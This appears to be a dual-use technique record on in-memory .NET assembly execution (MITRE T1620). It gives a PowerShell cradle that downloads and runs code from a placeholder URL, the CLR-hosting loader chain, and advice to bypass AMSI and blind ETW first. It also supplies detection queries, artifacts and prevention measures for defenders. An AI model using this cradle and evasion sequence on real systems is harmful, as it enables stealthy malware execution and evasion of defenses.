name: In-Memory .NET Assembly Execution (execute-assembly / CLR hosting)
command: Load a .NET assembly into memory and invoke its entry point without touching disk
description: In-memory .NET execution loads an assembly directly from a byte array (via [Reflection.Assembly]::Load or native CLR hosting - ICLRRuntimeHost/ICLRMetaHost) and invokes its entry point, so offensive .NET tools (Rubeus, Seatbelt, SharpHound) run entirely in memory with no PE on disk. This is the mechanic behind Cobalt Strike execute-assembly and is a reflective/non-standard module load (T1620).
source: MITRE ATT&CK T1620 (Reflective Code Loading); CLR hosting documentation
notes:
=== TWO COMMON PATHS ===
  1. Managed (PowerShell):
     $b = (New-Object Net.WebClient).DownloadData('<url>')
     [Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,[string[]]@('args')))
  2. Native CLR hosting (unmanaged loader):
     ICLRMetaHost -> ICLRRuntimeInfo -> ICorRuntimeHost/ICLRRuntimeHost -> load + ExecuteInDefaultAppDomain
     # used by execute-assembly so you can run .NET from an unmanaged implant.

=== WHY IT EVADES ===
  - No .NET EXE on disk, so on-disk AV signatures never fire.
  - Pairs with ETW patching (to blind Microsoft-Windows-DotNETRuntime) and AMSI bypass
    (.NET assemblies ARE scanned by AMSI since .NET 4.8 / Windows 10).

=== KEY DETECTION SURFACE (so pair with the blinds above) ===
  - CLR loaded into a process that is not normally managed (clr.dll/clrjit.dll in e.g. a C2 stager).
  - ETW .NET provider: assembly load events, Rundown.
  - AMSI amsiScanBuffer of the assembly bytes (.NET 4.8+).

=== ALTERNATIVES ===
  Reflective DLL injection, PowerShell IEX cradle (scriptable, but AMSI-scanned),
  BOF (beacon object files) for small C capabilities.

examples.label: Load and run a .NET assembly from bytes in PowerShell

references.title: MITRE ATT&CK T1620 - Reflective Code Loading
Microsoft - Hosting the Common Language Runtime

recommended.note: .NET assemblies are AMSI-scanned on 4.8+, so bypass AMSI first.
Blind the .NET ETW provider before the in-memory load.
Shellcode injection is the unmanaged analogue of in-memory loading.

defense.why_it_works: The CLR exposes documented APIs to load an assembly from a byte array and invoke it, and native hosting interfaces let an unmanaged process spin up the runtime on demand. Because the assembly never lands on disk, file-based detection has nothing to scan; only in-memory and ETW/AMSI telemetry observe it.
defense.prerequisites: Code execution in a process that can host the CLR (or already does). No admin required. On .NET 4.8+/Windows 10 the loaded bytes are passed to AMSI unless AMSI is already bypassed.
defense.impact: T1620 Reflective Code Loading. Runs full .NET offensive tooling (credential, recon, lateral-movement tools) in memory under a benign process, with no dropped executable.
defense.detection: Alert on clr.dll/clrjit.dll/mscoree.dll loading into a process that is not a known .NET application; the Microsoft-Windows-DotNETRuntime ETW provider assembly-load and AMSI assembly-scan events; AMSI amsiScanBuffer results on unsigned in-memory assemblies; EDR managed-memory scanning. If ETW is silenced, the silence plus a CLR load in an odd host is itself suspicious.
defense.artifacts: Sysmon EID 7 (ImageLoad) of clr.dll/clrjit.dll in an unexpected process; Microsoft-Windows-DotNETRuntime ETW events; AMSI 1033 scan events for .NET content; EDR in-memory .NET module detections.
defense.splunk_spl:
index=sysmon EventCode=7 ImageLoaded IN ("*clr.dll","*clrjit.dll","*mscoree.dll")
| search NOT Image IN ("*powershell.exe","*powershell_ise.exe","*w3wp.exe","*devenv.exe")
| stats count by Image, ImageLoaded, Computer
defense.elastic_kql: event.code:"7" and dll.name:(clr.dll or clrjit.dll or mscoree.dll) and not process.name:(powershell.exe or w3wp.exe or devenv.exe)
defense.sentinel_kql:
DeviceImageLoadEvents
| where FileName in~ ("clr.dll","clrjit.dll","mscoree.dll")
| where InitiatingProcessFileName !in~ ("powershell.exe","powershell_ise.exe","w3wp.exe","devenv.exe","dotnet.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName
defense.prevention: Keep AMSI enforced and enable Tamper Protection so .NET content is scanned on load; ship EDR with managed in-memory scanning; enforce WDAC to constrain which assemblies can execute; monitor the .NET ETW provider centrally and alert on CLR loads in non-.NET processes; baseline which hosts legitimately host the runtime.

detections.name: CLR loaded into a non-.NET host process
detections.logic:
index=sysmon EventCode=7 ImageLoaded IN ("*clr.dll","*clrjit.dll","*mscoree.dll") NOT Image IN ("*powershell.exe","*w3wp.exe","*devenv.exe","*dotnet.exe")
| stats count by Image, ImageLoaded, Computer
detections.false_positives: Any legitimate app that embeds the CLR (installers, management agents)
detections.tuning: Build a per-environment allowlist of CLR-hosting processes

detections.name: AMSI scan of unsigned in-memory .NET content
detections.logic:
DeviceEvents
| where ActionType == "AmsiScan" and AdditionalFields has "dotnet"
| where AdditionalFields has_any ("Rubeus","Seatbelt","SharpHound","unsigned")
| project Timestamp, DeviceName, InitiatingProcessFileName, AdditionalFields
detections.false_positives: Internal .NET tooling flagged by name heuristics
detections.tuning: Tune name heuristics; prefer behavioral correlation with ETW gaps
